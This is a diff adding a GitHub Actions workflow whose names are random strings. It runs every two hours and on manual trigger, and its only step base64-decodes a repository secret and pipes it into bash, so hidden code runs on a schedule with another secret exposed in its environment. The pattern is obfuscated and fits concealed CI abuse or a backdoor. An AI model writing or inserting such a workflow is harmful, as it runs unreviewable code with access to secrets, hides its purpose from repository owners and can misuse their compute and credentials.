@@ -1,0 +1,13 @@
+name: RnVBPv
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  DbvZeMwMudMb:
+    runs-on: ubuntu-22.04
+    env:
+      rebIckVsu: ${{ secrets.oxtoXl }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.BPtADT }}" | base64 -d | bash
